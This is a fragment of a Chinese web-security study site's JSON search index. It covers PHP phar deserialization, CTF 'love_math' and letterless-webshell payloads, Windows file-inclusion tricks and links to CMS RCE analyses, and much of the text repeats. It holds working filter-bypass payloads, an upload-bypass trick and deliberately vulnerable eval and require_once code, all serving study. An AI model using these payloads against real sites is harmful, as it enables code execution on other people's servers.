6\u4e2aJackson\u6709\u5173\u7684Java\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 Sec-News \u5b89\u5168\u6587\u6458 \u6570\u5341\u4e2a\u53cd\u5e8f\u5217\u5316\u6709\u5173\u7684\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 Sec-News \u5b89\u5168\u6587\u6458 Java\u5408\u96c6 https://paper.tuisec.win/search.jsp?keywords=Java Web-Security-Learning/README.md at master \u00b7 CHYbet... \u67d0\u5546\u57ce\u51e0\u5904\u6f0f\u6d1e\u5ba1\u8ba1\u5206\u6790 \u3010JSP\u4ee3\u7801\u5ba1\u8ba1\u3011\u67d0\u5546\u57ce\u51e0\u5904\u6f0f\u6d1e\u5ba1\u8ba1\u5206\u6790 JAVA\u4ee3\u7801\u5ba1\u8ba1\u4e4b\u94c1\u4eba\u4e0b\u8f7d\u7cfb\u7edf v1.0 JAVA\u4ee3\u7801\u5ba1\u8ba1\u4e4b\u94c1\u4eba\u4e0b\u8f7d\u7cfb\u7edf v1.0 | ADog's Blog","title":"Java\u5ba1\u8ba1"},{"location":"web_sec/advanAudit/pcre/","text":"php\u6b63\u5219\u8868\u8fbe\u5f0f\u5206\u6790 \u00b6","title":"php\u6b63\u5219\u8868\u8fbe\u5f0f\u5206\u6790"},{"location":"web_sec/advanAudit/pcre/#php","text":"","title":"php\u6b63\u5219\u8868\u8fbe\u5f0f\u5206\u6790"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/","text":"phar\u534f\u8bae \u00b6 \u751f\u6210phar\u6587\u4ef6 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php class User { Public $name ; } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar\uff0c\u751f\u6210\u540e\u53ef\u4ee5\u968f\u610f\u4fee\u6539 $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new User (); $o -> name = 'JrXnm' ; $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\u9700\u8981\u4fee\u6539 php.ini \u6587\u4ef6\uff0c\u8bbe\u7f6e phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3aOff\u3002 1 2 3 [Phar] ; http://php.net/phar.readonly phar.readonly = Off ;\u6ce8\u610f\u8981\u628a\u6ce8\u91ca\u7b26\u53f7\u53bb\u6389\uff01 \u7136\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 phar \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 $ xxd phar.phar 00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d <?php __HALT_COM 00000010: 5049 4c45 5228 293b 203f 3e0d 0a5c 0000 PILER(); ?>..\\.. 00000020: 0001 0000 0011 0000 0001 0000 0000 0026 ...............& 00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a ...O:4:\"User\":1: 00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 353a {s:4:\"name\";s:5: 00000050: 224a 7258 6e6d 223b 7d08 0000 0074 6573 \"JrXnm\";}....tes 00000060: 742e 7478 7404 0000 0027 6974 5d04 0000 t.txt....'it]... 00000070: 000c 7e7f d8b6 0100 0000 0000 0074 6573 ..~..........tes 00000080: 74f8 a03f 62ee 7060 991e e34c 7f75 bba6 t..?b.p`...L.u.. 00000090: fab8 acdc ac02 0000 0047 424d 42 .........GBMB \u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u662f\u6709\u53cd\u5e8f\u5217\u5316\u6570\u636e\u7684 \u7ed5\u8fc7\u4e0a\u4f20 \u00b6 \u6211\u4eec\u8fd8\u5728\u5f00\u5934\u770b\u5230\u4e86 <?php xxx; __HALT_COMPILER();?> \u8fd9\u6837\u5b50\u7684\u4ee3\u7801\uff0c\u8fd9\u5c31\u5bf9\u5e94\u751f\u6210phar\u6587\u4ef6\u4ee3\u7801\u4e2d\u7684 $phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); \u53ef\u4ee5\u7406\u89e3\u4e3a\u8fd9\u65f6phar\u6587\u4ef6\u7684\u4e00\u4e2a\u6807\u5fd7\uff0c\u5426\u5219phar\u6269\u5c55\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002 \u4f46\u5b9e\u9a8c\u8bc1\u660e\uff0c\u524d\u9762\u8fd9\u4e2a\u6807\u5fd7\u7684\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u524d\u9762\u6dfb\u52a0\u6ce8\u5165==GIF98a==\u8fd9\u6837\u7684\u6587\u4ef6\u5934\u7ed5\u8fc7\u4e0a\u4f20\u9650\u5236\u3002 \u6267\u884c \u00b6 \u6b64\u65f6\u56de\u5230\u6211\u4eec\u7684\u811a\u672c 1 2 3 4 5 6 7 8 9 10 11 <?php class User { public $name ; public function __destruct () { echo $this -> name ; } } $filename = 'phar://phar.phar/test.txt' ; file_get_contents ( $filename ); ?> \u8c03\u8bd5\u7684\u65f6\u5019\u4f60\u5c31\u4f1a\u53d1\u73b0\u660e\u660e\u53ea\u662f file_get_contents \u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5230\u4e86\u5185\u5bb9\uff0c\u7ed3\u679c\u5374\u795e\u5947\u7684\u8c03\u7528\u4e86 __destruct() \u65b9\u6cd5 \u539f\u7406 \u00b6","title":"phar\u534f\u8bae"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/#phar","text":"","title":"phar\u534f\u8bae"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/#phar_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php class User { Public $name ; } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar\uff0c\u751f\u6210\u540e\u53ef\u4ee5\u968f\u610f\u4fee\u6539 $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new User (); $o -> name = 'JrXnm' ; $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\u9700\u8981\u4fee\u6539 php.ini \u6587\u4ef6\uff0c\u8bbe\u7f6e phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3aOff\u3002 1 2 3 [Phar] ; http://php.net/phar.readonly phar.readonly = Off ;\u6ce8\u610f\u8981\u628a\u6ce8\u91ca\u7b26\u53f7\u53bb\u6389\uff01 \u7136\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 phar \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 $ xxd phar.phar 00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d <?php __HALT_COM 00000010: 5049 4c45 5228 293b 203f 3e0d 0a5c 0000 PILER(); ?>..\\.. 00000020: 0001 0000 0011 0000 0001 0000 0000 0026 ...............& 00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a ...O:4:\"User\":1: 00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 353a {s:4:\"name\";s:5: 00000050: 224a 7258 6e6d 223b 7d08 0000 0074 6573 \"JrXnm\";}....tes 00000060: 742e 7478 7404 0000 0027 6974 5d04 0000 t.txt....'it]... 00000070: 000c 7e7f d8b6 0100 0000 0000 0074 6573 ..~..........tes 00000080: 74f8 a03f 62ee 7060 991e e34c 7f75 bba6 t..?b.p`...L.u.. 00000090: fab8 acdc ac02 0000 0047 424d 42 .........GBMB \u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u662f\u6709\u53cd\u5e8f\u5217\u5316\u6570\u636e\u7684","title":"\u751f\u6210phar\u6587\u4ef6"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/#_1","text":"\u6211\u4eec\u8fd8\u5728\u5f00\u5934\u770b\u5230\u4e86 <?php xxx; __HALT_COMPILER();?> \u8fd9\u6837\u5b50\u7684\u4ee3\u7801\uff0c\u8fd9\u5c31\u5bf9\u5e94\u751f\u6210phar\u6587\u4ef6\u4ee3\u7801\u4e2d\u7684 $phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); \u53ef\u4ee5\u7406\u89e3\u4e3a\u8fd9\u65f6phar\u6587\u4ef6\u7684\u4e00\u4e2a\u6807\u5fd7\uff0c\u5426\u5219phar\u6269\u5c55\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002 \u4f46\u5b9e\u9a8c\u8bc1\u660e\uff0c\u524d\u9762\u8fd9\u4e2a\u6807\u5fd7\u7684\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u524d\u9762\u6dfb\u52a0\u6ce8\u5165==GIF98a==\u8fd9\u6837\u7684\u6587\u4ef6\u5934\u7ed5\u8fc7\u4e0a\u4f20\u9650\u5236\u3002","title":"\u7ed5\u8fc7\u4e0a\u4f20"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/#_2","text":"\u6b64\u65f6\u56de\u5230\u6211\u4eec\u7684\u811a\u672c 1 2 3 4 5 6 7 8 9 10 11 <?php class User { public $name ; public function __destruct () { echo $this -> name ; } } $filename = 'phar://phar.phar/test.txt' ; file_get_contents ( $filename ); ?> \u8c03\u8bd5\u7684\u65f6\u5019\u4f60\u5c31\u4f1a\u53d1\u73b0\u660e\u660e\u53ea\u662f file_get_contents \u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5230\u4e86\u5185\u5bb9\uff0c\u7ed3\u679c\u5374\u795e\u5947\u7684\u8c03\u7528\u4e86 __destruct() \u65b9\u6cd5","title":"\u6267\u884c"},{"location":"web_sec/advanAudit/phar\u534f\u8bae/#_3","text":"","title":"\u539f\u7406"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/","text":"php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7 \u00b6 \u56fd\u8d5b love_math \u00b6 \u901a\u8fc7\u6570\u5b66\u51fd\u6570\u8fdb\u884c\u8f6c\u6362 payload1 \u6267\u884c\u4efb\u610f\u51fd\u6570 1 /calc.php?c=base_convert(55490343972,10,36)() \u5c06\u5176\u8f6c\u5316\u4ece36\u8fdb\u5236\u8f6c\u4e3a10\u8fdb\u5236\u6267\u884c phpinfo \u51fd\u6570 payload2 \u7ed5\u8fc7\u5b57\u7b26\u4e32\u957f\u5ea6\u9650\u5236 1 /calc.php?abs=flag.php&pow=show_source&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs}) \u8fd9\u91cc\u5148\u6784\u9020\u51fa _GET \u5b57\u7b26\u4e32\uff0c\u7136\u540e $$pi \u53bb\u4eceGET\u8bf7\u6c42\u4e2d\u83b7\u53d6\u5230\u53c2\u6570(tql) \u6e90\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 <?php error_reporting ( 0 ); //\u542c\u8bf4\u4f60\u5f88\u559c\u6b22\u6570\u5b66\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u7231\u5b83\u80dc\u8fc7\u7231flag if ( ! isset ( $_GET [ 'c' ])){ show_source ( __FILE__ ); } else { //\u4f8b\u5b50 c=20-1 $content = $_GET [ 'c' ]; if ( strlen ( $content ) >= 80 ) { die ( \"\u592a\u957f\u4e86\u4e0d\u4f1a\u7b97\" ); } $blacklist = [ ' ' , '\\t' , '\\r' , '\\n' , '\\'' , '\"' , '`' , '\\[' , '\\]' ]; foreach ( $blacklist as $blackitem ) { if ( preg_match ( '/' . $blackitem . '/m' , $content )) { die ( \"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u5b57\u7b26\" ); } } //\u5e38\u7528\u6570\u5b66\u51fd\u6570http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [ 'abs' , 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod' , 'getrandmax' , 'hexdec' , 'hypot' , 'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , 'octdec' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt' , 'srand' , 'tan' , 'tanh' ]; preg_match_all ( '/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/' , $content , $used_funcs ); foreach ( $used_funcs [ 0 ] as $func ) { if ( ! in_array ( $func , $whitelist )) { die ( \"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u51fd\u6570\" ); } } //\u5e2e\u4f60\u7b97\u51fa\u7b54\u6848 eval ( 'echo ' . $content . ';' ); } \u7ed5waf getshell \u00b6 ctf-wiki \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php include 'flag.php' ; if ( isset ( $_GET [ 'code' ])){ $code = $_GET [ 'code' ]; if ( strlen ( $code ) > 40 ){ die ( \"Long.\" ); } if ( preg_match ( \"/[A-Za-z0-9]+/\" , $code )){ die ( \"NO.\" ); } @ eval ( $code ); } else { highlight_file ( __FILE__ ); } //$hint = \"php function getFlag() to get flag\"; ?> \u6784\u9020\u6ca1\u6709\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell \u6700\u540e\u7684 payload \u5982\u4e0b 1 ?code=$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]);&_=getFlag \u89e3\u8bfb\u4e00\u4e0b\uff1a 1 suctf2019 \u00b6 payload 1 \u53c2\u8003\u8d44\u6599 \u00b6 SUCTF2019WP \u56fd\u8d5bwp","title":"php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#php","text":"","title":"php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#love_math","text":"\u901a\u8fc7\u6570\u5b66\u51fd\u6570\u8fdb\u884c\u8f6c\u6362 payload1 \u6267\u884c\u4efb\u610f\u51fd\u6570 1 /calc.php?c=base_convert(55490343972,10,36)() \u5c06\u5176\u8f6c\u5316\u4ece36\u8fdb\u5236\u8f6c\u4e3a10\u8fdb\u5236\u6267\u884c phpinfo \u51fd\u6570 payload2 \u7ed5\u8fc7\u5b57\u7b26\u4e32\u957f\u5ea6\u9650\u5236 1 /calc.php?abs=flag.php&pow=show_source&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs}) \u8fd9\u91cc\u5148\u6784\u9020\u51fa _GET \u5b57\u7b26\u4e32\uff0c\u7136\u540e $$pi \u53bb\u4eceGET\u8bf7\u6c42\u4e2d\u83b7\u53d6\u5230\u53c2\u6570(tql) \u6e90\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 <?php error_reporting ( 0 ); //\u542c\u8bf4\u4f60\u5f88\u559c\u6b22\u6570\u5b66\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u7231\u5b83\u80dc\u8fc7\u7231flag if ( ! isset ( $_GET [ 'c' ])){ show_source ( __FILE__ ); } else { //\u4f8b\u5b50 c=20-1 $content = $_GET [ 'c' ]; if ( strlen ( $content ) >= 80 ) { die ( \"\u592a\u957f\u4e86\u4e0d\u4f1a\u7b97\" ); } $blacklist = [ ' ' , '\\t' , '\\r' , '\\n' , '\\'' , '\"' , '`' , '\\[' , '\\]' ]; foreach ( $blacklist as $blackitem ) { if ( preg_match ( '/' . $blackitem . '/m' , $content )) { die ( \"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u5b57\u7b26\" ); } } //\u5e38\u7528\u6570\u5b66\u51fd\u6570http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [ 'abs' , 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod' , 'getrandmax' , 'hexdec' , 'hypot' , 'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , 'octdec' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt' , 'srand' , 'tan' , 'tanh' ]; preg_match_all ( '/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/' , $content , $used_funcs ); foreach ( $used_funcs [ 0 ] as $func ) { if ( ! in_array ( $func , $whitelist )) { die ( \"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u51fd\u6570\" ); } } //\u5e2e\u4f60\u7b97\u51fa\u7b54\u6848 eval ( 'echo ' . $content . ';' ); }","title":"\u56fd\u8d5b love_math"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#waf-getshell","text":"","title":"\u7ed5waf  getshell"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#ctf-wiki","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php include 'flag.php' ; if ( isset ( $_GET [ 'code' ])){ $code = $_GET [ 'code' ]; if ( strlen ( $code ) > 40 ){ die ( \"Long.\" ); } if ( preg_match ( \"/[A-Za-z0-9]+/\" , $code )){ die ( \"NO.\" ); } @ eval ( $code ); } else { highlight_file ( __FILE__ ); } //$hint = \"php function getFlag() to get flag\"; ?> \u6784\u9020\u6ca1\u6709\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell \u6700\u540e\u7684 payload \u5982\u4e0b 1 ?code=$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]);&_=getFlag \u89e3\u8bfb\u4e00\u4e0b\uff1a 1","title":"ctf-wiki"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#suctf2019","text":"payload 1","title":"suctf2019"},{"location":"web_sec/advanAudit/php\u4e00\u4e9b\u5947\u6280\u6deb\u5de7/#_1","text":"SUCTF2019WP \u56fd\u8d5bwp","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web_sec/advanAudit/seacms\u5206\u6790/","text":"seacms\u6f0f\u6d1e\u5206\u6790 \u00b6 seacms9.92\u4ece\u53d8\u91cf\u8986\u76d6\u5230getshell seacms 9.92\u5168\u5c40\u53d8\u91cf\u8986\u76d6\u4ece\u8d8a\u6743\u5230RCE","title":"seacms\u6f0f\u6d1e\u5206\u6790"},{"location":"web_sec/advanAudit/seacms\u5206\u6790/#seacms","text":"seacms9.92\u4ece\u53d8\u91cf\u8986\u76d6\u5230getshell seacms 9.92\u5168\u5c40\u53d8\u91cf\u8986\u76d6\u4ece\u8d8a\u6743\u5230RCE","title":"seacms\u6f0f\u6d1e\u5206\u6790"},{"location":"web_sec/advanAudit/tp5/","text":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8fd8\u662f\u4e00\u6708\u4efd\u7684\u6587\u7ae0\u3002\u4e0d\u8fc7\u597d\u597d\u5b66\u4e60 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790"},{"location":"web_sec/advanAudit/tp5/#thinkphp-rce","text":"\u8fd8\u662f\u4e00\u6708\u4efd\u7684\u6587\u7ae0\u3002\u4e0d\u8fc7\u597d\u597d\u5b66\u4e60 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790"},{"location":"web_sec/advanAudit/windows\u4e2d\u7684\u4e00\u4e9btrick/","text":"windows\u4e2d\u7684\u4e00\u4e9btrick \u00b6 <\u548c>\u4ee3\u8868\u5b57\u7b26 \u00b6 1 2 3 4 5 6 7 <?php if ( stripos ( $_GET [ 'file' ], 'catchme_plz' ) !== False ) { die ( 'Come on!' ); } require_once ( $_GET [ 'file' ]); \u5176\u4e2d catchme_plz \u5185\u5bb9\u5982\u4e0b\uff1a 1 <?php echo 'Congratulations!';phpinfo();?> wamp\u548cphpstudy\u73af\u5883\u4e0b\uff0c\u5728\u6587\u4ef6\u540d\u4e0d\u53ef\u77e5\u90e8\u5206\u7528 < \u3001 > \u4ee3\u66ff\u5373\u53ef\uff0c\u53ea\u4f7f\u7528\u5355\u4e2a < \u3001 > \u53ea\u80fd\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u8868\u8fbe\u591a\u4e2a\u5b57\u7b26\u4f7f\u7528 << \u53e6\u5916\u5e76\u975e\u53ea\u6709 require \u3001 include \u3001 require_once \u3001 include_once \u4e00\u7c7b\u7684\u51fd\u6570\u80fd\u4f7f\u7528\uff1a \u51fd\u6570\u540d include include_once require fopen copy file_get_contents readfile file_put_contents mkdir touch move_uploaded_file opendir rewinddir closedir readdir tempnam parse_ini_file require_once windows\u77ed\u6587\u4ef6\u540d \u00b6 \u957f\u6587\u4ef6\u540d\u4e2d\u7684\u7a7a\u683c\u53ca\u975e\u6cd5\u5b57\u7b26(. \" \\/ [ ] : \\; = ,)\u4e0d\u5728\u77ed\u6587\u4ef6\u540d\u4e2d\u51fa\u73b0 \u53d6\u957f\u6587\u4ef6\u540d\u524d\u516d\u4e2a\u5b57\u7b26\uff0c\u552f\u4e00\u6587\u4ef6\u4ee5 ~1 \u7ed3\u5c3e\uff0c\u91cd\u590d\u6587\u4ef6\u4ee5 ~2 \u4ee5\u6b64\u7c7b\u63a8 \u622a\u53d6\u6587\u4ef6\u540e\u7f003\u4e2a\u5b57\u7b26\u4ee5\u5185\uff0c\u8d85\u8fc7\u4e09\u4e2a\u5b57\u7b26\u7684\u540e\u7f00\uff0c\u622a\u53d6\u524d\u4e09\u4e2a\u5b57\u7b26 \u8f6c\u6362\u6587\u4ef6\u540d\u4e2d\u6240\u6709\u5b57\u7b26\u4e3a\u5927\u5199 \u77ed\u6587\u4ef6\u540d\u4ec5\u5305\u542b\u4e00\u4e2a . \uff0cwindows\u4f1a\u5ffd\u7565\u540e\u9762\u6ca1\u6709\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4e2a\u53e5\u53f7 \u5bf9\u4e8e\u666e\u901a\u6587\u4ef6\u540d\uff0c\u8d85\u8fc7\u516b\u4e2a\u5b57\u7b26\u624d\u4f1a\u521b\u5efa\u77ed\u6587\u4ef6\u540d\uff0c\u82e5\u5c0f\u4e8e\u516b\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f\u6587\u4ef6\u540d\u542b\u6709\u7a7a\u683c\uff0c\u4e5f\u4f1a\u521b\u5efa\u77ed\u6587\u4ef6\u540d Windows\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7==dir /x==\u67e5\u770b\u6240\u6709\u7684\u77ed\u6587\u4ef6\u540d \u901a\u8fc7\u77ed\u6587\u4ef6\u540d\u7684\u65b9\u5f0f\u5305\u542b\u6587\u4ef6\uff1a \u4f46\u662f\u8fd9\u4e2apayload\u6ca1\u6709\u5c1d\u8bd5\u6210\u529f \u53c2\u8003 \u00b6 windows\u7684\u4e00\u4e9b\u7279\u6027 \u804a\u804a\u5b89\u5168\u6d4b\u8bd5\u4e2d\u5982\u4f55\u5feb\u901f\u641e\u5b9aWebshell \u6e17\u900f\u6d4b\u8bd5\u7684WINDOWS NTFS\u6280\u5de7\u96c6\u5408","title":"windows\u4e2d\u7684\u4e00\u4e9btrick"},{"location":"web_sec/advanAudit/windows\u4e2d\u7684\u4e00\u4e9btrick/#windowstrick","text":"","title":"windows\u4e2d\u7684\u4e00\u4e9btrick"},{"location":"web_sec/advanAudit/windows\u4e2d\u7684\u4e00\u4e9btrick/#_1","text":"1 2 3 4 5 6 7 <?php if ( stripos ( $_GET [ 'file' ], 'catchme_plz' ) !== False ) { die ( 'Come on!' ); } require_once ( $_GET [ 'file' ]); \u5176\u4e2d catchme_plz \u5185\u5bb9\u5982\u4e0b\uff1a 1 <?php echo 'Congratulations!';phpinfo();?> wamp\u548cphpstudy\u73af\u5883\u4e0b\uff0c\u5728\u6587\u4ef6\u540d\u4e0d\u53ef\u77e5\u90e8\u5206\u7528 < \u3001 > \u4ee3\u66ff\u5373\u53ef\uff0c\u53ea\u4f7f\u7528\u5355\u4e2a < \u3001 > \u53ea\u80fd\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u8868\u8fbe\u591a\u4e2a\u5b57\u7b26\u4f7f\u7528 << \u53e6\u5916\u5e76\u975e\u53ea\u6709 require \u3001 include \u3001 require_once \u3001 include_once \u4e00\u7c7b\u7684\u51fd\u6570\u80fd\u4f7f\u7528\uff1a \u51fd\u6570\u540d include include_once require fopen copy file_get_contents readfile file_put_contents mkdir touch move_uploaded_file opendir rewinddir closedir readdir tempnam parse_ini_file require_once","title":"&lt;\u548c&gt;\u4ee3\u8868\u5b57\u7b26"},{"location":"web_sec/advanAudit/windows\u4e2d\u7684\u4e00\u4e9btrick/#windows","text":"\u957f\u6587\u4ef6\u540d\u4e2d\u7684\u7a7a\u683c\u53ca\u975e\u6cd5\u5b57\u7b26(. \" \\/ [ ] : \\; = ,)\u4e0d\u5728\u77ed\u6587\u4ef6\u540d\u4e2d\u51fa\u73b0 \u53d6\u957f\u6587\u4ef6\u540d\u524d\u516d\u4e2a\u5b57\u7b26\uff0c\u552f\u4e00\u6587\u4ef6\u4ee5 ~1 \u7ed3\u5c3e\uff0c\u91cd\u590d\u6587\u4ef6\u4ee5 ~2 \u4ee5\u6b64\u7c7b\u63a8 \u622a\u53d6\u6587\u4ef6\u540e\u7f003\u4e2a\u5b57\u7b26\u4ee5\u5185\uff0c\u8d85\u8fc7\u4e09\u4e2a\u5b57\u7b26\u7684\u540e\u7f00\uff0c\u622a\u53d6\u524d\u4e09\u4e2a\u5b57\u7b26 \u8f6c\u6362\u6587\u4ef6\u540d\u4e2d\u6240\u6709\u5b57\u7b26\u4e3a\u5927\u5199 \u77ed\u6587\u4ef6\u540d\u4ec5\u5305\u542b\u4e00\u4e2a . \uff0cwindows\u4f1a\u5ffd\u7565\u540e\u9762\u6ca1\u6709\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4e2a\u53e5\u53f7 \u5bf9\u4e8e\u666e\u901a\u6587\u4ef6\u540d\uff0c\u8d85\u8fc7\u516b\u4e2a\u5b57\u7b26\u624d\u4f1a\u521b\u5efa\u77ed\u6587\u4ef6\u540d\uff0c\u82e5\u5c0f\u4e8e\u516b\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f\u6587\u4ef6\u540d\u542b\u6709\u7a7a\u683c\uff0c\u4e5f\u4f1a\u521b\u5efa\u77ed\u6587\u4ef6\u540d Windows\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7==dir /x==\u67e5\u770b\u6240\u6709\u7684\u77ed\u6587\u4ef6\u540d \u901a\u8fc7\u77ed\u6587\u4ef6\u540d\u7684\u65b9\u5f0f\u5305\u542b\u6587\u4ef6\uff1a \u4f46\u662f\u8fd9\u4e2apayload\u6ca1\u6709\u5c1d\u8bd5\u6210\u529f","title":"windows\u77ed\u6587\u4ef6\u540d"},{"location":"web_sec/advanAudit/windows\u4e2d\u7684\u4e00\u4e9btrick/#_2","text":"windows\u7684\u4e00\u4e9b\u7279\u6027 \u804a\u804a\u5b89\u5168\u6d4b\u8bd5\u4e2d\u5982\u4f55\u5feb\u901f\u641e\u5b9aWebshell \u6e17\u900f\u6d4b\u8bd5\u7684WINDOWS NTFS\u6280\u5de7\u96c6\u5408","title":"\u53c2\u8003"},{"location":"web_sec/advanAudit/\u5c0f\u5bc6\u5708\u6458\u5f55/","text":"\u5c0f\u5bc6\u5708\u6458\u5f55\u7684\u5185\u5bb9 \u00b6 \u5ba1\u8ba1\u7ec3\u4e60\u98981 \u00b6 1 2 3 4 5 <?php $str = addslashes ( $_GET [ 'option' ]); $file = file_get_contents ( 